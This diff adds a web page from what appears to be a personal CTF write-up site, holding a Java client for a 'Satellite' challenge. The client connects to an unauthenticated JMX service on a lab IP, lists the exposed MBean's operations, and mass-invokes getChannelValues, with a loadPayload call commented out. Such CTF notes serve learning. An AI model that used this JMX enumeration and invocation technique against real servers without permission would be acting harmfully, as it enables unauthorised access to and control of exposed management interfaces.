@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>2024-CSO-CTF · Will Seligman</title>
+<link rel="stylesheet" href="/assets/style.css">
+</head>
+<body>
+<button id="menu-toggle" aria-label="Toggle navigation">&#9776; Menu</button>
+<div class="layout">
+<aside class="sidebar" id="sidebar">
+  <a class="brand" href="/index.html">
+    <span class="brand-flag">&#127988;</span>
+    <span class="brand-text"><strong>Will Seligman</strong><small>Cybersecurity Notes & CTF Writeups</small></span>
+  </a>
+  <nav class="nav" id="nav-root" data-current="other/2024-cso-ctf.html"></nav>
+</aside>
+<main class="content">
+  <article class="doc">
+  <div class="breadcrumb"><a href="/other/index.html">Other</a></div>
+  <h1 id="2024-cso-ctf">2024-CSO-CTF</h1>
+<p><span class="img-missing">image unavailable</span></p>
+<p><span class="img-missing">image unavailable</span></p>
+<p>Personal</p>
+<p><span class="img-missing">image unavailable</span></p>
+<p>Successfully got flag from Reverse challenge</p>
+<p><span class="img-missing">image unavailable</span></p>
+<p><span class="img-missing">image unavailable</span></p>
+<p><span class="img-missing">image unavailable</span></p>
+<p>The Satellite challenge</p>
+<p><span class="img-missing">image unavailable</span></p>
+<pre><code class="language-java">import javax.management.*;
+import javax.management.remote.*;
+import java.util.*;
+import java.io.*;
+import java.net.*;
+
+public class JMXConnect {
+public static void main(String[] args) throws Exception {
+String mbean = &quot;gov.sfb.schriever:type=Galileo&quot;;
+String hostname = &quot;10.0.2.135&quot;;
+int port = 1958;
+    JMXServiceURL jmxUrl = new JMXServiceURL(&quot;service:jmx:rmi:///jndi/rmi://&quot; + hostname + &quot;:&quot; + port + &quot;/jmxrmi&quot;);
+    JMXConnector jmxConnector = JMXConnectorFactory.connect(jmxUrl, null);
+
+    try {
+        MBeanServerConnection mbs = jmxConnector.getMBeanServerConnection();
+        ObjectName mbeanName = new ObjectName(mbean);
+        MBeanInfo mbeanInfo = mbs.getMBeanInfo(mbeanName);
+
+        // Print attributes
+        System.out.println(&quot;Attributes:&quot;);
+        for (MBeanAttributeInfo attr : mbeanInfo.getAttributes()) {
+            String attrName = attr.getName();
+            if (attrName.startsWith(&quot;channels&quot;)) {
+                Object attrValue = mbs.getAttribute(mbeanName, attrName);
+                System.out.println(&quot;\\tName: &quot; + attrName + &quot;, Value: &quot; + attrValue);
+            }
+        }
+
+    // Print the available operations
+    System.out.println(&quot;Available Operations:&quot;);
+    for (MBeanOperationInfo op : mbeanInfo.getOperations()) {
+        System.out.println(&quot;\\tOperation Name: &quot; + op.getName());
+     }
+
+    // Invoke the loadPayload operation
+        //System.out.println(&quot;Loading payload...&quot;);
+        //Object[] loadPayloadParams = {0}; // Assuming payload ID is 0
+        //String[] loadPayloadSignature = {&quot;int&quot;};
+        //mbs.invoke(mbeanName, &quot;loadPayload&quot;, loadPayloadParams, loadPayloadSignature);
+        //System.out.println(&quot;Payload loaded successfully.&quot;);
+
+        // Invoke the getChannelValues operation
+        //System.out.println(&quot;Getting channel values...&quot;);
+        //Object result = mbs.invoke(mbeanName, &quot;getChannelValues&quot;, null, null);
+        //System.out.println(&quot;Channel values: &quot; + result);
+
+        // Declare totalChannels and totalSubchannels variables
+        int totalChannels = 350;
+        int totalSubchannels = 260;
+
+        //Iterate over channels and subchannels
+        System.out.println(&quot;Channel Values:&quot;);
+        for (int channel = 1; channel &lt;= totalChannels; channel++) {
+            for (int subchannel = 1; subchannel &lt;= totalSubchannels; subchannel++) {
+                try {
+                    Object[] params = {channel, subchannel};
+                    String[] signature = {&quot;int&quot;, &quot;int&quot;};
+                    Object result = mbs.invoke(mbeanName, &quot;getChannelValues&quot;, params, signature);
+                    System.out.println(&quot;Channel &quot; + channel + &quot;, Subchannel &quot; + subchannel + &quot;: &quot; + result);
+                } catch (Exception e) {
+                    System.err.println(&quot;Error invoking getChannelValues for Channel &quot; + channel + &quot;, Subchannel &quot; + subchannel + &quot;: &quot; + e.getMessage());
+                    e.printStackTrace();
+                }
+            }
+        }
+
+    } finally {
+        jmxConnector.close();
+    }
+}
+}
+</code></pre>
+  </article>
+  <footer class="foot">Notes by Will Seligman · built from Notion</footer>
+</main>
+</div>
+<script src="/assets/nav.js" defer></script>
+<script>
+document.getElementById('menu-toggle').addEventListener('click',function(){
+  document.getElementById('sidebar').classList.toggle('open');
+});
+</script>
+</body>
+</html>
